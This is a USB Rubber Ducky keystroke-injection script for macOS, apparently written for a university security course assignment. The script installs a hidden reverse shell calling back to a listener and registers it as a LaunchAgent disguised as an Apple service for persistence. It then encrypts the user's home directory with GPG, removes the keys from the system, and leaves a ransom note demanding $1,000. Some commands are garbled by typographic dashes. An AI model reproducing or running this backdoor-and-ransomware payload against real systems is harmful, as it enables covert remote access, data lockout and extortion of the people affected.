
REM Zachary Nandapurkar
REM ITP 325 Rubber Ducky Project


REM —————————————————————————————————————————————————————————————————————————————
REM Wait for OS to recognize ducky as keyboard & start run box
DELAY 3000
GUI r
DELAY 200



REM —————————————————————————————————————————————————————————————————————————————
REM	[5 points] Install a meterpreter backdoor (persistence) into the target system, without being detected by any anti-virus software
REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/



REM Catch the shell with 'nc -l -p 1337'
REM http://patrickmosca.com/root-a-mac-in-10-seconds-or-less/
DELAY 1000
GUI SPACE
STRING terminal
DELAY 500
ENTER
DELAY 500
STRING mkdir ~/Library/.hidden
ENTER
DELAY 200
STRING echo '#!/bin/bash
ENTER
REM My IP substituted in here: 
STRING bash -i >& /dev/tcp/10.0.2.5/1337 0>&1
ENTER
STRING wait' > ~/Library/.hidden/connect.sh
ENTER
DELAY 500
STRING chmod +x ~/Library/.hidden/connect.sh
ENTER
DELAY 200
STRING mkdir ~/Library/LaunchAgents
ENTER
DELAY 200
STRING echo '<plist version="1.0">
ENTER
STRING <dict>
ENTER
STRING <key>Label</key>
ENTER
STRING <string>com.apples.services</string>
ENTER
STRING <key>ProgramArguments</key>
ENTER
STRING <array>
ENTER
STRING <string>/bin/sh</string>
ENTER
STRING <string>'$HOME'/Library/.hidden/connect.sh</string>
ENTER
STRING </array>
ENTER
STRING <key>RunAtLoad</key>
ENTER
STRING <true/>
ENTER
STRING <key>StartInterval</key>
ENTER
STRING <integer>60</integer>
ENTER
STRING <key>AbandonProcessGroup</key>
ENTER
STRING <true/>
ENTER
STRING </dict>
ENTER
STRING </plist>' > ~/Library/LaunchAgents/com.apples.services.plist
ENTER
DELAY 200
STRING chmod 600 ~/Library/LaunchAgents/com.apples.services.plist
ENTER
DELAY 200
STRING launchctl load ~/Library/LaunchAgents/com.apples.services.plist
ENTER
DELAY 200




REM —————————————————————————————————————————————————————————————————————————————
REM Download and install GPG
REM Reference: https://github.com/hak5darren/USB-Rubber-Ducky/wiki/Payload---OS-X-Wget-and-Execute

REM Title: OS X Wget and Execute
REM Author: Jesse Wallace (c0deous)


DELAY 500
REM Homebrew is the easiest way to download and install gnupg on a mac
STRING ruby -e "$(curl -fsSL https://raw.githubusercontent.com/Homebrew/install/master/install)" 
ENTER
DELAY 500
STRING brew install gnupg
ENTER
DELAY 1000

REM You can change the above line to the command used to open your program.



REM —————————————————————————————————————————————————————————————————————————————
REM  Generate a GPG key using the password “OMGWTFBBQChicken” without the quotes

REM initialize a key and import the public key from the site
DELAY 1000
STRING gpg -—gen-key
ENTER
DELAY 500
STRING 1
ENTER
DELAY 500
STRING 2048
ENTER
STRING 0
ENTER
STRING y
ENTER
DELAY 500
REM Come up with a name
STRING h4ck3r
ENTER
DELAY 500
STRING zen1usa@gmail.com
ENTER
DELAY 500
ENTER 
STRING o
ENTER
DELAY 500
STRING OMGWTFBBQCHICKEN
ENTER
DELAY 500
STRING OMGWTFBBQCHICKEN
ENTER
DELAY 500
REM get the public key from chi’s website
STRING wget -O ~/Downloads “http://-bcf.usc.edu/~chiso/itp325/public_key.asc”
ENTER
DELAY 1000
STRING gpg —import ~/Downloads/public_key.asc
ENTER
DELAY 1000
 

REM ———————————————————————————————————————————————————————————————————————————————
REM	[5 points] Encrypt the current users home directory using the previous GPG keys. This means everything within it.

REM zip up the home folder and encrypt it
DELAY 1000
REM Package the folder first into a tar
STRING tar -c -z -f home.tar.gz -C ~
ENTER
DELAY 9000
STRING gpg -ea -r zen1usa@gmail.com -r chiso@usc.edu home.tar.gz
ENTER
DELAY 9000


REM ———————————————————————————————————————————————————————————————————————————
REM	[5 points] Export the public/private key from GPG onto a USB, and securely delete the GPG key from the system’s keychain

REM export the keys first to files  
DELAY 500
STRING gpg —-export —armor “h4ck3r <zen1usa@gmail.com>” > private_key.asc
ENTER
DELAY 500
REM Move them to the usb drive
STRING sudo cp private_key.asc /media/
ENTER
DELAY 500
STRING sudo cp ~/Downloads/public_key.asc /media/
ENTER
DELAY 1000
STRING gpg --delete-secret-key “h4ck3r <zen1usa@gmail.com>”
ENTER
DELAY 1000
STRING gpg —-delete-key “Chi So <chiso@usc.edu>”
ENTER
DELAY 1000


REM —————————————————————————————————————————————————————————————————————————————
REM	[5 points] Install an addon for the default browser of the system.


REM open up the default browser (likely safari) and download an extension
DELAY 500
STRING open https://safari-extensions.apple.com/extensions/com.kablock.osx-UYW4V22L7E/Ka-Block.safariextz
ENTER
DELAY 300
ENTER
DELAY 2500


REM ———————————————————————————————————————————————————————————————
REM	[5 points] Leave an unencrypted ransom note on the current user’s desktop. For bonus lulz, leave a meme.

REM open up to the desktop and write a text file using touch command
DELAY 2000
STRING cd /Desktop/
ENTER
DELAY 2500
STRING touch TO_DECRYPT.txt
ENTER
STRING echo “YOU MUST PAY $1,000 by December 11th to decrypt these files or else the encryption keys will be deleted forever” > TO_DECRYPT.txt
ENTER
COMMAND w




